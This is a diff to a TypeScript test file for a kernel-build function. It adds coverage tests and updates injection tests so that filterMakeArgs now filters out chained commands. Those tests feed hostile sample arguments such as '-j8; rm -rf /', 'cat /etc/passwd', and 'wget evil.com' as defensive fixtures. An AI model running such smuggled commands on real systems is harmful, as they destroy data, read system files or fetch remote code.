@@ -332,7 +332,7 @@ describe('buildKernel', () => {
   it('handles exec exception and returns false', async () => {
     vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
     vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
-    vi.mocked(exec.exec).mockImplementation(async (cmd) => {
+    vi.mocked(exec.exec).mockImplementation(async (cmd, args) => {
       if (cmd === 'make') {
         throw new Error('Command failed');
       }
@@ -357,7 +357,7 @@ describe('buildKernel', () => {
   it('warns when clang is not found in PATH', async () => {
     vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
     vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
-    vi.mocked(exec.exec).mockImplementation(async (cmd) => {
+    vi.mocked(exec.exec).mockImplementation(async (cmd, args) => {
       if (cmd === 'which') {
         throw new Error('Command not found');
       }
@@ -543,9 +543,9 @@ describe('buildKernel additional coverage', () => {
     vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
     vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
     const debugMock = vi.mocked(core.debug);
-    
+
     // First exec (which clang) succeeds, second exec (make) throws
-    vi.mocked(exec.exec).mockImplementation(async (cmd) => {
+    vi.mocked(exec.exec).mockImplementation(async (cmd, args) => {
       if (cmd === 'make') {
         throw new Error('Make failed');
       }
@@ -616,6 +616,81 @@ describe('buildKernel additional coverage', () => {
     const result = await buildKernel(config);
 
     expect(result).toBe(true);
+  });
+
+  // Coverage: ccache with empty cmdPath (Line 110)
+  it('sets ccache as only PATH when cmdPath is empty', async () => {
+    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
+    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
+    // Mock which clang to fail so cmdPath stays empty
+    vi.mocked(exec.exec).mockImplementation(async (cmd, args) => {
+      if (cmd === 'which') {
+        throw new Error('Command not found');
+      }
+      return 0;
+    });
+
+    const config: BuildConfig = {
+      kernelDir: '/kernel',
+      arch: 'arm64',
+      config: 'defconfig',
+      toolchain: {
+        // No toolchain paths provided, so cmdPath will stay empty
+        clangPath: undefined,
+        gcc64Path: undefined,
+        gcc32Path: undefined,
+        gcc64Prefix: undefined,
+        gcc32Prefix: undefined,
+      },
+      extraMakeArgs: '',
+      useCcache: true,
+    };
+
+    await buildKernel(config);
+
+    // Verify PATH contains only ccache when no toolchain paths
+    const makeCall = vi.mocked(exec.exec).mock.calls.find(call => call[0] === 'make');
+    expect(makeCall).toBeDefined();
+    if (makeCall && makeCall[2]) {
+      const env = (makeCall[2] as any).env;
+      // When cmdPath is empty and useCcache is true, PATH should be "/usr/lib/ccache:..."
+      expect(env.PATH).toMatch(/\/usr\/lib\/ccache/);
+    }
+  });
+
+  // Coverage: make stderr callback (Lines 202-204)
+  it('captures stderr output during build', async () => {
+    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
+    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
+    const stderrWriteSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+
+    // Mock exec to trigger stderr callback
+    vi.mocked(exec.exec).mockImplementation(async (cmd, args, options) => {
+      if (cmd === 'make' && options?.listeners?.stderr) {
+        options.listeners.stderr(Buffer.from('Error: compilation warning'));
+      }
+      return 0;
+    });
+
+    const config: BuildConfig = {
+      kernelDir: '/kernel',
+      arch: 'arm64',
+      config: 'defconfig',
+      toolchain: {},
+      extraMakeArgs: '',
+      useCcache: false,
+    };
+
+    await buildKernel(config);
+
+    // Verify stderr was written to log file and process.stderr
+    expect(fs.appendFileSync).toHaveBeenCalledWith(
+      expect.stringContaining('build.log'),
+      expect.any(Buffer)
+    );
+    expect(stderrWriteSpy).toHaveBeenCalledWith(Buffer.from('Error: compilation warning'));
+
+    stderrWriteSpy.mockRestore();
   });
 });
 
@@ -720,35 +795,35 @@ describe('Dangerous command detection', () => {
   });
 
   describe('Command injection pattern detection', () => {
-    it('allows arguments with semicolons (filterMakeArgs does not check command chaining)', () => {
+    it('filters out arguments with semicolons (command chaining prevention)', () => {
       const args = ['-j8; rm -rf /', 'V=1; cat /etc/passwd'];
       const filtered = filterMakeArgs(args);
-      // filterMakeArgs only checks prefixes, not command chaining characters
-      expect(filtered).toEqual(args);
+      // filterMakeArgs now filters command chaining characters
+      expect(filtered).toEqual([]);
     });
 
-    it('allows arguments with ampersands (filterMakeArgs does not check command chaining)', () => {
+    it('filters out arguments with ampersands (command chaining prevention)', () => {
       const args = ['-j8 && wget malicious.com', 'V=1 && ./backdoor'];
       const filtered = filterMakeArgs(args);
-      expect(filtered).toEqual(args);
+      expect(filtered).toEqual([]);
     });
 
-    it('allows arguments with backticks (filterMakeArgs does not check command substitution)', () => {
+    it('filters out arguments with backticks (command substitution prevention)', () => {
       const args = ['-j8 `cat /etc/passwd`', 'V=`whoami`'];
       const filtered = filterMakeArgs(args);
-      expect(filtered).toEqual(args);
+      expect(filtered).toEqual([]);
     });
 
-    it('allows arguments with dollar parentheses (filterMakeArgs does not check command substitution)', () => {
+    it('filters out arguments with dollar parentheses (command substitution prevention)', () => {
       const args = ['-j8 $(cat /etc/passwd)', 'V=$(whoami)'];
       const filtered = filterMakeArgs(args);
-      expect(filtered).toEqual(args);
+      expect(filtered).toEqual([]);
     });
 
-    it('allows arguments with pipes (filterMakeArgs does not check pipes)', () => {
+    it('filters out arguments with pipes (pipe injection prevention)', () => {
       const args = ['-j8 | cat /etc/passwd', 'V=1 | wget evil.com'];
       const filtered = filterMakeArgs(args);
-      expect(filtered).toEqual(args);
+      expect(filtered).toEqual([]);
     });
   });
 
